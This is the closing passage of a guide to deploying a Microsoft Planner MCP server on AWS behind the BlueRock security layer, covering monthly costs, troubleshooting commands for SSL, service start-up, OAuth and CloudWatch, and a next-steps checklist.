| Data Transfer | 100 GB out | ~$9 |
| CloudWatch Logs | 10 GB ingestion, 30 day retention | ~$5 |
| Secrets Manager | 2 secrets | ~$0.80 |
| Snapshots | 7 daily snapshots (20 GB each) | ~$3 |
| **Total** | | **~$35/month** |

**Cost Optimization Tips:**
- Use t3.micro for development/testing
- Set CloudWatch log retention to 7 days for access logs
- Use lifecycle policies to manage snapshot retention
- Consider Reserved Instances for long-term production (save up to 72%)

---

## Troubleshooting

### Issue: SSL Certificate Fails

**Symptoms:** Certbot fails with "Connection refused"

**Solution:**
```bash
# Ensure port 80 is open in security group
# Stop nginx temporarily
sudo systemctl stop nginx

# Try standalone mode
sudo certbot certonly --standalone -d planner-mcp.yourdomain.com

# Start nginx
sudo systemctl start nginx
```

### Issue: Service Fails to Start

**Symptoms:** `systemctl status planner-mcp` shows "failed"

**Solution:**
```bash
# Check logs
sudo journalctl -u planner-mcp -n 50

# Common issues:
# 1. Secrets not loaded - check IAM role
aws sts get-caller-identity  # Verify identity

# 2. Port 8080 already in use
sudo lsof -i :8080

# 3. Python dependencies missing
cd /opt/planner-mcp
source venv/bin/activate
pip install -r requirements.txt
```

### Issue: OAuth Redirect Fails

**Symptoms:** "Redirect URI mismatch" error

**Solution:**
1. Verify Azure redirect URI matches exactly: `https://planner-mcp.yourdomain.com/auth/callback`
2. Check AZURE_BASE_URL in configuration
3. Ensure DNS is resolving correctly: `dig planner-mcp.yourdomain.com`
4. Verify nginx is proxying correctly: `curl -v https://planner-mcp.yourdomain.com/.well-known/oauth-authorization-server`

### Issue: BlueRock Events Not Appearing in CloudWatch

**Symptoms:** No security events in CloudWatch logs

**Solution:**
```bash
# Check BlueRock status
sudo systemctl status bluerock

# Verify OTEL configuration
sudo cat /etc/bluerock/otel-config.yaml

# Check IAM permissions for CloudWatch
aws logs describe-log-groups --log-group-name-prefix /aws/bluerock

# Restart BlueRock
sudo systemctl restart bluerock
```

---

## Next Steps

1. ✅ Review this integration plan
2. 🔄 **Subscribe to BlueRock on AWS Marketplace**
3. 🔄 **Launch EC2 instance with BlueRock AMI**
4. 🔄 Configure security groups and Elastic IP
5. 🔄 Set up DNS (optional but recommended)
6. 🔄 SSH into instance and install dependencies
7. 🔄 Configure AWS Secrets Manager
8. 🔄 Set up SSL/TLS with Certbot
9. 🔄 Configure Nginx reverse proxy
10. 🔄 Deploy application code
11. 🔄 Configure CloudWatch logging
12. 🔄 Update Azure app registration for production URL
13. 🔄 Test OAuth flow end-to-end
14. 🔄 Set up monitoring and alerts
15. 🔄 Document runbook and emergency contacts

---

## Conclusion

This integration plan provides a **production-ready, security-hardened deployment** for the Microsoft Planner MCP Server using:

- ✅ **FastMCP with Azure OAuth** (authentication layer)
- ✅ **BlueRock Secure MCP Server** (runtime security layer)
- ✅ **AWS infrastructure** (scalable, reliable hosting)
- ✅ **CloudWatch monitoring** (observability and alerting)
- ✅ **Defense in depth** (multiple security layers)

**Total Security Layers:** 5
**Estimated Setup Time:** 4-6 hours
**Monthly Cost:** ~$0.40 (free tier) to ~$35 (production)
**Maintenance:** ~2 hours/month

The result is an **enterprise-grade MCP server** that's secure, scalable, and production-ready with comprehensive monitoring and automated security protection.
